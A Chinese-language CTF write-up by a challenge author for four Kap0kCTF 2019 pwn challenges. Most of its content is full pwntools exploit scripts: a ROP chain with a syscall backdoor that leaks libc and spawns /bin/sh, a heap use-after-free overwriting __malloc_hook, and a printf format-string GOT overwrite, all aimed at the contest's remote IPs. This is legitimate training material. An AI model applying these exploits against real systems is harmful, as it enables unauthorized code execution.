# Kap0kCTF_2019_PWN_WP

出的什么垃圾题目

翻车

## blindpwn

3 solved

### 题目描述

前一天晚上随手出的nc pwn... 想着不要那么简单直接`cat flag`, 所以关了stdout, 没想到翻车. 还真没人搜的出来那个`错误的文件描述符`吗

### 利用

我这给两种解法
```bash
cat flag >&2 # 重定向到stderr

. ./flag # 报错的方式
```

## dark

0 solved

### 题目描述

ROP, 同样关闭stdout, 然后在puts函数调用前藏了一段汇编指令(backdoor, 还F5不). 你说没有找到? 没有关系, 按照rop来做, ROPgadget之类的工具也会跑出来的.

但是找到了的话, 思路就很明显了, 用`syscall; ret;` 这个backdoor来进行ROP的构造, 

这个时候我们要想如何去控制rax(rdi, rsi都很容易控制), 我这里的选择是使用read函数返回值是读入的长度这个tricks来控制, 当然还有其他的办法 (我懒得去想了2333)

ROP的构造思路也很简单, 我们可以先系统调用`write`来leak libc, 然后将`system`函数地址和`/bin/sh\x00`写入到bss,最后通过一个间接跳转的gadget来getshell

这里注意, 因为关闭了stdout, 所以write的参数fd我们用stderr的fd来leak

### 利用

我的exp是自己封装了一下pwntools, 但是逻辑是一样的, 具体的自己改一下交互就行

```python
from q4n import *

r=PWN("./dark_3c2b7a214be7a073dcda5860fe027549")
# r.proc()
r.remote("222.201.144.148","28021")
r.ru("goodbye!\n")

syscall=0x00000000004007ab
pdi=0x0000000000400873
psip=0x0000000000400871
read=r.elf.plt['read']
bss=0x000601060
read_got=r.elf.got['read']
p12ppp=0x000000000040086c
# 0x0000000000400859 : call qword ptr [r12 + rbx*8]
call=0x0000000000400859

payload='\x00'*0x28
payload+=flat(psip,bss,0,read)
payload+=flat(psip,bss+0x200,0,read,pdi,2,psip,read_got,0,syscall, pdi,0,psip,bss+0x200,0,read,)
payload+=flat(pdi,bss,p12ppp,bss+0x200,0,0,0,call)
payload=payload.ljust(0x100,'\x00')
r.sd(payload)
sleep(0.1)
r.sd('/bin/sh\x00'.ljust(0x100,'\x00'))

sleep(0.1)
r.sd('\n')

r.libc.address=u64(r.rv(8))-r.libc.sym['read']
Log("libc",r.libc.address)
# sleep(0.1)
# r.sd('a'*0x3b)
sleep(0.1)
r.sd(p64(r.libc.sym['system']).ljust(0x100,'\x00'))
r.sl("cat flag >&2")

r.ia()
```

## baigei_heap

0 solved

### 题目描述

白给堆, 正如其名. 首先想办法`leak libc` 接下来常规操作UAF, 分配到`__malloc_hook`即可. 

啥都给了, 简单的很. 

### 利用

```python
from q4n import *

r=PWN("./baigei_heap_8fbdfa98bf88f62eb922f6f1263e505f")
# r.proc()
r.remote("222.201.144.148","28085")
def menu(idx):
    r.sla(">> " ,str(idx))
def add(sz,con):
    menu(1)
    r.sla("size?\n",str(sz))
    r.sla("content?\n",con)
def free():
    menu(3)
def edit(con):
    menu(2)
    r.sla("content?\n",con)

add(0x60,"a")
free()
add(0x60,"a")
free()
add(0x70,"a")
add(0x100,"a")
free()

add(0x60,"a"*8)
r.ru('a'*8)
r.libc.address=u64(r.rl()[:-1].ljust(8,'\x00'))-0x3c4b78
free()
edit(p64(0x3c4b10-0x13+r.libc.address))
add(0x60,"a"*8)
add(0x60,'a'*3+p64(r.libc.sym['system'])) #
menu(1)
# r.debugf("record\nb system\nc")
r.sla("size?",str(r.libc.address+0x18cd57))

r.ia()
```

## printf

1 solved

### 题目描述

`@Lewis`出的题, 难度貌似刚好? (本来我还以为太简单了的...
网上应该也能找到类似的, 随便翻个exp大概就出来了吧=.=

printf leak libc, 然后写printf@got为system, 下一次read一个/bin/sh;进去, getshell

### 利用

一把梭, 虽然我本地不行, 但是远程通了. XD

``` python
from pwn import *

class leak:
	pass

context(os="linux", arch="amd64", log_level="debug")
filename = "./printf"
addr = "39.108.134.72"
port = 9999
REMOTE = 1
l = leak()
if REMOTE == 0:
	p = process(filename, aslr=0)
	libcname = "/lib/x86_64-linux-gnu/libc.so.6"
else:
	p = remote(addr, port)
	libcname = "./libc.so.6"
e = ELF(filename)
libc = ELF(libcname)

sd = lambda s="" : p.send(str(s))
sl = lambda s="" : p.sendline(str(s))
rc = lambda n=4096 : p.recv(n)
ru = lambda s="", drop=True : p.recvuntil(str(s), drop=drop)

def show_leak():
	global l
	try:
		log.info("libc: "+hex(l.libc))
	except:
		pass
	try:
		log.info("heap: "+hex(l.heap))
	except:
		pass
	try:
		log.info("stack: "+hex(l.stack))
	except:
		pass
	try:
		log.info("prog: "+hex(l.prog))
	except:
		pass
	pause()

def debug(breakpoint=""):
	if REMOTE == 0:
		gdb.attach(p, breakpoint)
	show_leak()

# debug()

ru("Come on!\n")
payload = "%13$p."
sl(payload)
l.libc = int(ru("."), 16) - 0x8e8a2
show_leak()

ru("Come on!\n")
printf = e.got["printf"]
system = libc.symbols["system"] + l.libc
payload = ""
t = system
last = 0
for i in range(4):
	payload += "%{}d%{}$hn".format(t % 0x10000 - last + 0x10000, 18+i) #t % 0x10000 - last + 0x10000
	last = t % 0x10000
	t = t >> 16
payload = payload.ljust(0x60, "\x00")
for i in range(4):
	payload += p64(printf + i * 2)
sl(payload)

ru("Come on!\n")
sl("/bin/sh\x00")

p.interactive()
```



## upxofc

***隐藏***

感兴趣的私聊... 这题准备继续完善
